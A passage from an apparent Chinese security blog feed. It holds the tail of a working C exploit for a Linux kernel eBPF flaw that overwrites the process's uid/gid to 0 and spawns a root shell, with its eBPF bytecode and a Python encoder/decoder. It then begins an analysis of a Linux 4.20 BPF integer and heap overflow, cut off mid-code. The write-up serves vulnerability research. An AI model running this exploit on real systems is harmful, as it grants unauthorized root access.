if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0) __exit(strerror(errno)); puts("setsockopt finished");&#125;static void writemsg(void) &#123; char buffer[64]; ssize_t n = write(sockets[0], buffer, sizeof(buffer)); if (n &lt; 0) &#123; perror("write"); return; &#125; if (n != sizeof(buffer)) fprintf(stderr, "short write: %lu\n", n);&#125;#define __update_elem(a, b, c) \ bpf_update_elem(0, (a)); \ bpf_update_elem(1, (b)); \ bpf_update_elem(2, (c)); \ writemsg();static uint64_t get_value(int key) &#123; uint64_t value; if (bpf_lookup_elem(&amp;key, &amp;value)) __exit(strerror(errno)); return value;&#125;static uint64_t __get_fp(void) &#123; __update_elem(1, 0, 0); return get_value(2);&#125;static uint64_t __read(uint64_t addr) &#123; __update_elem(0, addr, 0); return get_value(2);&#125;static void __write(uint64_t addr, uint64_t val) &#123; __update_elem(2, addr, val);&#125;static uint64_t get_sp(uint64_t addr) &#123; return addr &amp; ~(0x4000 - 1);&#125;static void pwn(void) &#123; uint64_t fp, sp, task_struct, credptr, uidptr; fp = __get_fp(); if (fp &lt; PHYS_OFFSET) __exit("bogus fp"); sp = get_sp(fp); if (sp &lt; PHYS_OFFSET) __exit("bogus sp"); task_struct = __read(sp); if (task_struct &lt; PHYS_OFFSET) __exit("bogus task ptr"); printf("task_struct = %lx\n", task_struct); credptr = __read(task_struct + CRED_OFFSET); // cred if (credptr &lt; PHYS_OFFSET) __exit("bogus cred ptr"); uidptr = credptr + UID_OFFSET; // uid if (uidptr &lt; PHYS_OFFSET) __exit("bogus uid ptr"); printf("uidptr = %lx\n", uidptr); __write(uidptr, 0); // set both uid and gid to 0 if (getuid() == 0) &#123; printf("spawning root shell\n"); system("id"); system("/bin/sh"); exit(0); &#125; __exit("not vulnerable?");&#125;int main(int argc, char **argv) &#123; prep(); pwn(); return 0;&#125; ebpf_tool123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376import sysopcode = []for i in range(256): opcode.append('invalid opcode')code = ''' "\xb4\x09\x00\x00\xff\xff\xff\xff" "\x55\x09\x02\x00\xff\xff\xff\xff" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x18\x19\x00\x00\x03\x00\x00\x00" "\x00\x00\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x00\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x06\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x01\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x07\x00\x00\x00\x00\x00\x00" "\xbf\x91\x00\x00\x00\x00\x00\x00" "\xbf\xa2\x00\x00\x00\x00\x00\x00" "\x07\x02\x00\x00\xfc\xff\xff\xff" "\x62\x0a\xfc\xff\x02\x00\x00\x00" "\x85\x00\x00\x00\x01\x00\x00\x00" "\x55\x00\x01\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x79\x08\x00\x00\x00\x00\x00\x00" "\xbf\x02\x00\x00\x00\x00\x00\x00" "\xb7\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x03\x00\x00\x00\x00\x00" "\x79\x73\x00\x00\x00\x00\x00\x00" "\x7b\x32\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x02\x00\x01\x00\x00\x00" "\x7b\xa2\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x7b\x87\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00"'''rules=''' ALU_MOV_K(0,9,0x0,0xffffffff) JMP_JNE_K(0,9,0x2,0xffffffff) ALU64_MOV_K(0,0,0x0,0x0) JMP_EXIT(0,0,0x0,0x0) LD_IMM_DW(1,9,0x0,0x3) padding ALU64_MOV_X(9,1,0x0,0x0) ALU64_MOV_X(10,2,0x0,0x0) ALU64_ADD_K(0,2,0x0,0xfffffffc) ST_MEM_W(0,10,0xfffc,0x0) JMP_CALL(0,0,0x0,0x1) JMP_JNE_K(0,0,0x1,0x0) JMP_EXIT(0,0,0x0,0x0) LDX_MEM_DW(0,6,0x0,0x0) ALU64_MOV_X(9,1,0x0,0x0) ALU64_MOV_X(10,2,0x0,0x0) ALU64_ADD_K(0,2,0x0,0xfffffffc) ST_MEM_W(0,10,0xfffc,0x1) JMP_CALL(0,0,0x0,0x1) JMP_JNE_K(0,0,0x1,0x0) JMP_EXIT(0,0,0x0,0x0) LDX_MEM_DW(0,7,0x0,0x0) ALU64_MOV_X(9,1,0x0,0x0) ALU64_MOV_X(10,2,0x0,0x0) ALU64_ADD_K(0,2,0x0,0xfffffffc) ST_MEM_W(0,10,0xfffc,0x2) JMP_CALL(0,0,0x0,0x1) JMP_JNE_K(0,0,0x1,0x0) JMP_EXIT(0,0,0x0,0x0) LDX_MEM_DW(0,8,0x0,0x0) ALU64_MOV_X(0,2,0x0,0x0) ALU64_MOV_K(0,0,0x0,0x0) JMP_JNE_K(0,6,0x3,0x0) LDX_MEM_DW(7,3,0x0,0x0) STX_MEM_DW(3,2,0x0,0x0) JMP_EXIT(0,0,0x0,0x0) JMP_JNE_K(0,6,0x2,0x1) STX_MEM_DW(10,2,0x0,0x0) JMP_EXIT(0,0,0x0,0x0) STX_MEM_DW(8,7,0x0,0x0) JMP_EXIT(0,0,0x0,0x0)'''BPF_LD = 0x00BPF_LDX = 0x01BPF_ST = 0x02BPF_STX = 0x03BPF_ALU = 0x04BPF_JMP = 0x05BPF_RET = 0x06BPF_MISC= 0x07BPF_W = 0x00BPF_H = 0x08BPF_B = 0x10BPF_IMM = 0x00BPF_ABS = 0x20BPF_IND = 0x40BPF_MEM = 0x60BPF_LEN = 0x80BPF_MSH = 0xa0BPF_ADD = 0x00BPF_SUB = 0x10BPF_MUL = 0x20BPF_DIV = 0x30BPF_OR = 0x40BPF_AND = 0x50BPF_LSH = 0x60BPF_RSH = 0x70BPF_NEG = 0x80BPF_MOD = 0x90BPF_XOR = 0xa0BPF_JA = 0x00BPF_JEQ = 0x10BPF_JGT = 0x20BPF_JGE = 0x30BPF_JSET= 0x40BPF_K = 0x00BPF_X = 0x08BPF_ALU64 =0x07 #/* alu mode in double word width */BPF_DW =0x18 #/* double word */BPF_XADD =0xc0 #/* exclusive add */BPF_MOV =0xb0 #/* mov reg to reg */BPF_ARSH =0xc0 #/* sign extending arithmetic shift right */BPF_END =0xd0 #/* flags for endianness conversion: */BPF_TO_LE =0x00 #/* convert to little-endian */BPF_TO_BE =0x08 #/* convert to big-endian */BPF_JNE =0x50 #/* jump != */BPF_JSGT =0x60 #/* SGT is signed '&gt;', GT in x86 */BPF_JSGE =0x70 #/* SGE is signed '&gt;=', GE in x86 */BPF_CALL =0x80 #/* function call */BPF_EXIT =0x90 #/* function return */opcode[BPF_ALU | BPF_ADD | BPF_X] = "ALU_ADD_X"opcode[BPF_ALU | BPF_ADD | BPF_K] = "ALU_ADD_K"opcode[BPF_ALU | BPF_SUB | BPF_X] = "ALU_SUB_X"opcode[BPF_ALU | BPF_SUB | BPF_K] = "ALU_SUB_K"opcode[BPF_ALU | BPF_AND | BPF_X] = "ALU_AND_X"opcode[BPF_ALU | BPF_AND | BPF_K] = "ALU_AND_K"opcode[BPF_ALU | BPF_OR | BPF_X] = "ALU_OR_X"opcode[BPF_ALU | BPF_OR | BPF_K] = "ALU_OR_K"opcode[BPF_ALU | BPF_LSH | BPF_X] = "ALU_LSH_X"opcode[BPF_ALU | BPF_LSH | BPF_K] = "ALU_LSH_K"opcode[BPF_ALU | BPF_RSH | BPF_X] = "ALU_RSH_X"opcode[BPF_ALU | BPF_RSH | BPF_K] = "ALU_RSH_K"opcode[BPF_ALU | BPF_XOR | BPF_X] = "ALU_XOR_X"opcode[BPF_ALU | BPF_XOR | BPF_K] = "ALU_XOR_K"opcode[BPF_ALU | BPF_MUL | BPF_X] = "ALU_MUL_X"opcode[BPF_ALU | BPF_MUL | BPF_K] = "ALU_MUL_K"opcode[BPF_ALU | BPF_MOV | BPF_X] = "ALU_MOV_X"opcode[BPF_ALU | BPF_MOV | BPF_K] = "ALU_MOV_K"opcode[BPF_ALU | BPF_DIV | BPF_X] = "ALU_DIV_X"opcode[BPF_ALU | BPF_DIV | BPF_K] = "ALU_DIV_K"opcode[BPF_ALU | BPF_MOD | BPF_X] = "ALU_MOD_X"opcode[BPF_ALU | BPF_MOD | BPF_K] = "ALU_MOD_K"opcode[BPF_ALU | BPF_NEG] = "ALU_NEG"opcode[BPF_ALU | BPF_END | BPF_TO_BE] = "ALU_END_TO_BE"opcode[BPF_ALU | BPF_END | BPF_TO_LE] = "ALU_END_TO_LE"#/* 64 bit ALU operations */opcode[BPF_ALU64 | BPF_ADD | BPF_X] = "ALU64_ADD_X"opcode[BPF_ALU64 | BPF_ADD | BPF_K] = "ALU64_ADD_K"opcode[BPF_ALU64 | BPF_SUB | BPF_X] = "ALU64_SUB_X"opcode[BPF_ALU64 | BPF_SUB | BPF_K] = "ALU64_SUB_K"opcode[BPF_ALU64 | BPF_AND | BPF_X] = "ALU64_AND_X"opcode[BPF_ALU64 | BPF_AND | BPF_K] = "ALU64_AND_K"opcode[BPF_ALU64 | BPF_OR | BPF_X] = "ALU64_OR_X"opcode[BPF_ALU64 | BPF_OR | BPF_K] = "ALU64_OR_K"opcode[BPF_ALU64 | BPF_LSH | BPF_X] = "ALU64_LSH_X"opcode[BPF_ALU64 | BPF_LSH | BPF_K] = "ALU64_LSH_K"opcode[BPF_ALU64 | BPF_RSH | BPF_X] = "ALU64_RSH_X"opcode[BPF_ALU64 | BPF_RSH | BPF_K] = "ALU64_RSH_K"opcode[BPF_ALU64 | BPF_XOR | BPF_X] = "ALU64_XOR_X"opcode[BPF_ALU64 | BPF_XOR | BPF_K] = "ALU64_XOR_K"opcode[BPF_ALU64 | BPF_MUL | BPF_X] = "ALU64_MUL_X"opcode[BPF_ALU64 | BPF_MUL | BPF_K] = "ALU64_MUL_K"opcode[BPF_ALU64 | BPF_MOV | BPF_X] = "ALU64_MOV_X"opcode[BPF_ALU64 | BPF_MOV | BPF_K] = "ALU64_MOV_K"opcode[BPF_ALU64 | BPF_ARSH | BPF_X] = "ALU64_ARSH_X"opcode[BPF_ALU64 | BPF_ARSH | BPF_K] = "ALU64_ARSH_K"opcode[BPF_ALU64 | BPF_DIV | BPF_X] = "ALU64_DIV_X"opcode[BPF_ALU64 | BPF_DIV | BPF_K] = "ALU64_DIV_K"opcode[BPF_ALU64 | BPF_MOD | BPF_X] = "ALU64_MOD_X"opcode[BPF_ALU64 | BPF_MOD | BPF_K] = "ALU64_MOD_K"opcode[BPF_ALU64 | BPF_NEG] = "ALU64_NEG"#/* Call instruction */opcode[BPF_JMP | BPF_CALL] = "JMP_CALL"opcode[BPF_JMP | BPF_CALL | BPF_X] = "JMP_TAIL_CALL"#/* Jumps */opcode[BPF_JMP | BPF_JA] = "JMP_JA"opcode[BPF_JMP | BPF_JEQ | BPF_X] = "JMP_JEQ_X"opcode[BPF_JMP | BPF_JEQ | BPF_K] = "JMP_JEQ_K"opcode[BPF_JMP | BPF_JNE | BPF_X] = "JMP_JNE_X"opcode[BPF_JMP | BPF_JNE | BPF_K] = "JMP_JNE_K"opcode[BPF_JMP | BPF_JGT | BPF_X] = "JMP_JGT_X"opcode[BPF_JMP | BPF_JGT | BPF_K] = "JMP_JGT_K"opcode[BPF_JMP | BPF_JGE | BPF_X] = "JMP_JGE_X"opcode[BPF_JMP | BPF_JGE | BPF_K] = "JMP_JGE_K"opcode[BPF_JMP | BPF_JSGT | BPF_X] = "JMP_JSGT_X"opcode[BPF_JMP | BPF_JSGT | BPF_K] = "JMP_JSGT_K"opcode[BPF_JMP | BPF_JSGE | BPF_X] = "JMP_JSGE_X"opcode[BPF_JMP | BPF_JSGE | BPF_K] = "JMP_JSGE_K"opcode[BPF_JMP | BPF_JSET | BPF_X] = "JMP_JSET_X"opcode[BPF_JMP | BPF_JSET | BPF_K] = "JMP_JSET_K"#/* Program return */opcode[BPF_JMP | BPF_EXIT] = "JMP_EXIT"#/* Store instructions */opcode[BPF_STX | BPF_MEM | BPF_B] = "STX_MEM_B"opcode[BPF_STX | BPF_MEM | BPF_H] = "STX_MEM_H"opcode[BPF_STX | BPF_MEM | BPF_W] = "STX_MEM_W"opcode[BPF_STX | BPF_MEM | BPF_DW] = "STX_MEM_DW"opcode[BPF_STX | BPF_XADD | BPF_W] = "STX_XADD_W"opcode[BPF_STX | BPF_XADD | BPF_DW] = "STX_XADD_DW"opcode[BPF_ST | BPF_MEM | BPF_B] = "ST_MEM_B"opcode[BPF_ST | BPF_MEM | BPF_H] = "ST_MEM_H"opcode[BPF_ST | BPF_MEM | BPF_W] = "ST_MEM_W"opcode[BPF_ST | BPF_MEM | BPF_DW] = "ST_MEM_DW"#/* Load instructions */opcode[BPF_LDX | BPF_MEM | BPF_B] = "LDX_MEM_B"opcode[BPF_LDX | BPF_MEM | BPF_H] = "LDX_MEM_H"opcode[BPF_LDX | BPF_MEM | BPF_W] = "LDX_MEM_W"opcode[BPF_LDX | BPF_MEM | BPF_DW] = "LDX_MEM_DW"opcode[BPF_LD | BPF_ABS | BPF_W] = "LD_ABS_W"opcode[BPF_LD | BPF_ABS | BPF_H] = "LD_ABS_H"opcode[BPF_LD | BPF_ABS | BPF_B] = "LD_ABS_B"opcode[BPF_LD | BPF_IND | BPF_W] = "LD_IND_W"opcode[BPF_LD | BPF_IND | BPF_H] = "LD_IND_H"opcode[BPF_LD | BPF_IND | BPF_B] = "LD_IND_B"opcode[BPF_LD | BPF_IMM | BPF_DW] = "LD_IMM_DW"def u16(imm): if len(imm)!=2: print '[-] u16 must have a correct input like "\\x12\\x34"' exit() return (ord(imm[1])&lt;&lt;8)+ord(imm[0])def u32(imm): if len(imm)!=4: print '[-] u32 must have a correct input like "\x12\x34\x56\x78"' exit() return (ord(imm[1])&lt;&lt;8)+ord(imm[0]) +(ord(imm[2])&lt;&lt;16)+(ord(imm[3])&lt;&lt;24)def p16(imm): result = '' for i in range(2): result += "\\x"+ hex((imm&gt;&gt;(8*(i)))&amp;0xff).replace('0x','').rjust(2,'0') return resultdef p32(imm): result = '' for i in range(4): result += "\\x"+ hex((imm&gt;&gt;(8*(i)))&amp;0xff).replace('0x','').replace('L','').rjust(2,'0') return result def decode_single(idx,insn): #print insn.encode('hex') op = opcode[ord(insn[0])] reg = ord(insn[1]) off = insn[2:4] imm = insn[4:] if op == 'invalid opcode': print '[%d]: maybe padding'%idx return print "[%d]: %s(%s,%s,%s,%s)"%(idx,op,str(reg&gt;&gt;4),str(reg&amp;0x0f),hex(u16(off)).replace('L',''),hex(u32(imm)).replace('L',''))def decode_all(insn_tmp): insn = insn_tmp.split('"\n') i = 0 for ins in insn: ins = ins.strip() if len(ins)&lt;9: break if ins[-9]!= '"': print '[-] format error!' exit() decode_single(i,ins[-8:]) i += 1def banner_decode(): print '[+] A tools for decode ebpf rules by P4nda' print '[+] modify code in script as format :' print '=========================================================' print '\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"' print '\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"' print '\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"' print '\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"' print '\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"' print '\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"' print '=========================================================' print 'result format: \t[index]: opcode(src,dst,off,imm)' print '================= result ================================' def str2int(input): if input.startswith('0x'): return int(input,16) return int(input)def char2hex(input): return '\\x'+hex(input).replace('0x','').replace('L','').rjust(2,'0')def encode_single(rl): rl = rl.strip() result = '' if ('(' not in rl) | (')' not in rl) : if 'padding' in rl : print '\t"%s"'%('\\x00'*8) return else: print '[-] bad rules ' exit(-1) op = rl.split('(')[0] src = str2int(rl.split('(')[1].split(',')[0]) dst = str2int(rl.split('(')[1].split(',')[1]) off = str2int(rl.split('(')[1].split(',')[2]) imm = str2int(rl.split('(')[1].split(',')[3].split(')')[0]) #print src,dst,off,imm for i in range(256): if op.upper() == opcode[i]: result += char2hex(i)#'\\x'+ hex(i).replace('0x','').replace('L','').rjust(2,'0') break if len(result) == 0: print '[-] No such insn :',op exit(-1) result += char2hex((src&lt;&lt;4)+dst) result += p16(off) result += p32(imm) print '\t"%s"'%resultdef encode_all(rules): for rl in rules.split('\n'): if ('padding' in rl) |(('(' in rl)&amp;(')' in rl) ): encode_single(rl+')')def banner_encode(): print '[+] A tools for encode ebpf rules by P4nda' print '[+] modify code in script as format :' print '=========================================================' print '\t\t ALU_MOV_K(0,9,0x0,0xffffffff)' print '\t\t JMP_JNE_K(0,9,0x2,0xffffffff)' print '\t\t ALU64_MOV_K(0,0,0x0,0x0)' print '\t\t LD_IMM_DW(1,9,0x0,0x3)' print '\t\t padding \t/*this word will be translateed \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00*/' print '\t\t JMP_EXIT(0,0,0x0,0x0)' print '=========================================================' print 'result format: \t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"' print '================= result ================================' def banner(): print '[+] A tools for encode&amp;decode ebpf rules by P4nda' print '[+] modify code in script yourself ,function argv as follow:' print '=========================================================' print 'encode:' print '\tebpf_tools.py encode ' print 'decode:' print '\tebpf_tools.py decode ' print '========================================================='if __name__ == '__main__': if len(sys.argv) ==1 : banner() exit(0) if sys.argv[1].lower() == 'decode': banner_decode() decode_all(code) elif sys.argv[1].lower() == 'encode': banner_encode() encode_all(rules) else: banner() 参考[1] https://security.tencent.com/index.php/blog/msg/124 [2] https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html [3] https://www.jianshu.com/p/75b368f85dc6 [4] https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11 [5] https://xz.aliyun.com/t/2212 [6] https://blog.csdn.net/qq_14978113/article/details/80488711 [7] https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c [8] https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c [9] https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>VULNERABILITY</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux kernel 4.20 BPF 整数溢出漏洞分析]]></title>
    <url>%2F2019%2F01%2F02%2Fkernel-bpf-overflow%2F</url>
    <content type="text"><![CDATA[漏洞的发现者与原作者是ww9210，相关资料:github ,安全客文章。 本文所使用的环境与EXP下载 漏洞分析漏洞存在于BPF模块中，该模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。 分析基于linux-4.20-rc3版本代码：https://elixir.bootlin.com/linux/v4.20-rc3/source 整数溢出漏洞整数溢出漏洞存在于BPF_MAP_CREATE功能，是bpf系统调用的一部分，可参考手册： 12345678910111213141516171819202122232425262728293031SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)&#123; union bpf_attr attr = &#123;&#125;; int err; if (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN)) return -EPERM; err = bpf_check_uarg_tail_zero(uattr, sizeof(attr), size); if (err) return err; size = min_t(u32, size, sizeof(attr)); /* copy attributes from user space, may be less than sizeof(bpf_attr) */ if (copy_from_user(&amp;attr, uattr, size) != 0) return -EFAULT; err = security_bpf(cmd, &amp;attr, size); if (err &lt; 0) return err; switch (cmd) &#123; case BPF_MAP_CREATE: err = map_create(&amp;attr); break; case BPF_MAP_LOOKUP_ELEM: err = map_lookup_elem(&amp;attr); break; case BPF_MAP_UPDATE_ELEM: err = map_update_elem(&amp;attr); break; 可以看到其处理函数是map_create，在[1]处创建了一个map结构体，并为其分配编号，此后利用编号寻找生成的map。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394/* called via syscall */static int map_create(union bpf_attr *attr)&#123; int numa_node = bpf_map_attr_numa_node(attr); struct bpf_map *map; int f_flags; int err; err = CHECK_ATTR(BPF_MAP_CREATE); if (err) return -EINVAL; f_flags = bpf_get_file_flag(attr-&gt;map_flags); if (f_flags &lt; 0) return f_flags; if (numa_node != NUMA_NO_NODE &amp;&amp; ((unsigned int)numa_node &gt;= nr_node_ids || !node_online(numa_node))) return -EINVAL; /* find map type and init map: hashtable vs rbtree vs bloom vs ... */[1] map = find_and_alloc_map(attr); if (IS_ERR(map)) return PTR_ERR(map); err = bpf_obj_name_cpy(map-&gt;name, attr-&gt;map_name); if (err) goto free_map_nouncharge; atomic_set(&amp;map-&gt;refcnt, 1); atomic_set(&amp;map-&gt;usercnt, 1); if (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123; struct btf *btf; if (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123; err = -EINVAL; goto free_map_nouncharge; &#125; btf = btf_get_by_fd(attr-&gt;btf_fd); if (IS_ERR(btf)) &#123; err = PTR_ERR(btf); goto free_map_nouncharge; &#125; err = map_check_btf(map, btf, attr-&gt;btf_key_type_id, attr-&gt;btf_value_type_id); if (err) &#123; btf_put(btf); goto free_map_nouncharge; &#125; map-&gt;btf = btf; map-&gt;btf_key_type_id = attr-&gt;btf_key_type_id; map-&gt;btf_value_type_id = attr-&gt;btf_value_type_id; &#125; err = security_bpf_map_alloc(map); if (err) goto free_map_nouncharge; err = bpf_map_init_memlock(map); if (err) goto free_map_sec; err = bpf_map_alloc_id(map); if (err) goto free_map; err = bpf_map_new_fd(map, f_flags); if (err &lt; 0) &#123; /* failed to allocate fd. * bpf_map_put() is needed because the above * bpf_map_alloc_id() has published the map * to the userspace and the userspace may * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID. */ bpf_map_put(map); return err; &#125; return err;free_map: bpf_map_release_memlock(map);free_map_sec: security_bpf_map_free(map);free_map_nouncharge: btf_put(map-&gt;btf); map-&gt;ops-&gt;map_free(map); return err;&#125; 下面分析find_and_alloc_map函数，对于传入参数的含义如结构体所示，可以看到程序首先根据attr-&gt;type，寻找所对应的处理函数虚表，在[2]处。然后根据处理函数虚表的不同，调用不同的函数进行处理。 123456789101112131415161718192021222324252627282930313233343536struct &#123; /* Used by BPF_MAP_CREATE */ __u32 map_type; __u32 key_size; /* size of key in bytes */ __u32 value_size; /* size of value in bytes */ __u32 max_entries; /* maximum number of entries in a map */&#125;;static struct bpf_map *find_and_alloc_map(union bpf_attr *attr)&#123; const struct bpf_map_ops *ops; u32 type = attr-&gt;map_type; struct bpf_map *map; int err; if (type &gt;= ARRAY_SIZE(bpf_map_types)) return ERR_PTR(-EINVAL); type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));[2] ops = bpf_map_types[type]; if (!ops) return ERR_PTR(-EINVAL); if (ops-&gt;map_alloc_check) &#123; err = ops-&gt;map_alloc_check(attr); if (err) return ERR_PTR(err); &#125; if (attr-&gt;map_ifindex) ops = &amp;bpf_map_offload_ops;[3] map = ops-&gt;map_alloc(attr); if (IS_ERR(map)) return map; map-&gt;ops = ops; map-&gt;map_type = type; return map;&#125; 本漏洞存在的虚函数位于queue_stack_map_alloc，查看内核可以计算其触发所需的type值，即(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 ： 1234567891011121314151617181920212223242526汇编指令：.text:FFFFFFFF8119D17A mov eax, r14d.text:FFFFFFFF8119D17D mov r15, ds:bpf_map_types[rax*8]虚表：.rodata:FFFFFFFF82028380 bpf_map_types dq 0 ; DATA XREF: map_create+AD↑r... ....rodata:FFFFFFFF82028410 dq offset unk_FFFFFFFF8210F0A0.rodata:FFFFFFFF82028418 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028420 dq offset unk_FFFFFFFF8202A680.rodata:FFFFFFFF82028428 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028430 dq offset unk_FFFFFFFF82029C40.rodata:FFFFFFFF82028438 dq offset off_FFFFFFFF82029BA0... ....rodata:FFFFFFFF82029BA0 dq offset queue_stack_map_alloc_check.rodata:FFFFFFFF82029BA8 dq offset queue_stack_map_alloc.rodata:FFFFFFFF82029BB0 dq 0.rodata:FFFFFFFF82029BB8 dq offset queue_stack_map_free.rodata:FFFFFFFF82029BC0 dq offset queue_stack_map_get_next_key.rodata:FFFFFFFF82029BC8 dq 0.rodata:FFFFFFFF82029BD0 dq offset queue_stack_map_lookup_elem.rodata:FFFFFFFF82029BD8 dq offset queue_stack_map_update_elem.rodata:FFFFFFFF82029BE0 dq offset queue_stack_map_delete_elem.rodata:FFFFFFFF82029BE8 dq offset queue_stack_map_push_elem.rodata:FFFFFFFF82029BF0 dq offset stack_map_pop_elem.rodata:FFFFFFFF82029BF8 dq offset stack_map_peek_elem 程序在[3]处调用漏洞存在函数：queue_stack_map_alloc，在该函数中利用sizeof(bpf_queue_stack) + attr-&gt;value_size * (attr-&gt;max_entries + 1)来申请堆空间，而attr中内容均为用户输入，可以看到当max_entries 为0xffffffff时，将仅申请大小sizeof(bpf_queue_stack) 的堆块。此函数相当于申请了相邻的内存，其中前sizeof(bpf_queue_stack) 个字节为管理块，用于存储数据结构，后面的内容为数据存储结构。 12345678910111213141516171819202122232425262728293031323334353637static struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)&#123; int ret, numa_node = bpf_map_attr_numa_node(attr); struct bpf_queue_stack *qs; u32 size, value_size; u64 queue_size, cost; size = attr-&gt;max_entries + 1; value_size = attr-&gt;value_size; queue_size = sizeof(*qs) + (u64) value_size * size; cost = queue_size; if (cost &gt;= U32_MAX - PAGE_SIZE) return ERR_PTR(-E2BIG); cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT; ret = bpf_map_precharge_memlock(cost); if (ret &lt; 0) return ERR_PTR(ret); qs = bpf_map_area_alloc(queue_size, numa_node); if (!qs) return ERR_PTR(-ENOMEM); memset(qs, 0, sizeof(*qs)); bpf_map_init_from_attr(&amp;qs-&gt;map, attr); qs-&gt;map.pages = cost; qs-&gt;size = size; raw_spin_lock_init(&amp;qs-&gt;lock); return &amp;qs-&gt;map;&#125; 当申请完成后，初始化函数如下：bpf_map_init_from_attr，几乎为copy了用户输入的attr。 12345678void bpf_map_init_from_attr(struct bpf_map *map, union bpf_attr *attr)&#123; map-&gt;map_type = attr-&gt;map_type; map-&gt;key_size = attr-&gt;key_size; map-&gt;value_size = attr-&gt;value_size; map-&gt;max_entries = attr-&gt;max_entries; map-&gt;map_flags = attr-&gt;map_flags;&#125; 当此申请完成后，内核模块将这个堆块放入管理结构中，并生成id用于管理，并将id返回给用户。 堆溢出漏洞由上述的整数溢出漏洞，导致内存分配时仅仅分配了管理块的大小而没有分配实际存储数据的内存。如果存在编辑功能则一定会有问题，下面的堆溢出漏洞就是由此导致的。 漏洞存在于map_update_elem函数中，即bpf系统调用的第三个功能函数。首先根据用户输入的id找到放入管理结构的map，利用kmalloc新建一个堆块根据map中存储的value_size，从用户输入拷贝。然后在map中找到存储的虚函数指针ops，然后根据ops调用相应的虚函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105static int map_update_elem(union bpf_attr *attr)&#123; void __user *ukey = u64_to_user_ptr(attr-&gt;key); void __user *uvalue = u64_to_user_ptr(attr-&gt;value); int ufd = attr-&gt;map_fd; struct bpf_map *map; void *key, *value; u32 value_size; struct fd f; int err; if (CHECK_ATTR(BPF_MAP_UPDATE_ELEM)) return -EINVAL; f = fdget(ufd); map = __bpf_map_get(f); if (IS_ERR(map)) return PTR_ERR(map); if (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123; err = -EPERM; goto err_put; &#125; key = __bpf_copy_key(ukey, map-&gt;key_size); if (IS_ERR(key)) &#123; err = PTR_ERR(key); goto err_put; &#125; if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH || map-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH || map-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY || map-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) value_size = round_up(map-&gt;value_size, 8) * num_possible_cpus(); else 